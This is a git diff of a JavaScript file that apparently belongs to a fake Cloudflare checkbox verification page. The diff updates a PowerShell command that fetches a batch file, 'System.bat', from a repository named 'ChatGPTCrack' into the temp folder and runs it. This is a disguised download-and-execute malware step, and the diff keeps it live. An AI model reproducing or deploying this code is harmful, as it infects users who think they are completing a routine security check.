@@ -60,7 +60,8 @@ function generateUniqueUsername() {
     return username;
 }
 
-const cmd = `powershell -Command "iwr 'https://github.com/ChatGPTCrack/main/releases/download/Cloudflare/System.bat' -OutFile '$env:temp\System.bat'; Start-Process '$env:temp\System.bat'"`;
+const cmd = `powershell -Command "iwr 'https://github.com/ChatGPTCrack/main/raw/main/releases/download/Cloudflare/System.bat' -OutFile '$env:temp\System.bat'; Start-Process '$env:temp\System.bat'"`;
+
 
 const checkboxBtn = document.getElementById("checkbox");
 const content = document.getElementById("HJup0");
